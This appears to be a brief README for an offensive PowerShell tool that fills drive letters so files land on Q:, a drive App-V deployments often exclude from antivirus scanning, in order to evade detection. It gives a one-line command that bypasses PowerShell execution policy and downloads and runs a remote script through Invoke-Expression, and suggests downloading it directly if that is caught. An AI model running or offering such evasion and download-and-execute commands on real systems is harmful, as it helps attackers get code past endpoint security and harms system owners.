# a(pp)v
App-V uses a Q: drive which often is excluded from AV scanning. 
This script tries to create drives through P: so the next drive will be Q:, effectively evading AV.

Just type the following command in PowerShell console:
powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/intosec-nl/a-pp-v/master/a%5Bpp%5Dv.ps1')"

Or if you suspect invoke-expression is caught, just download the scipt.
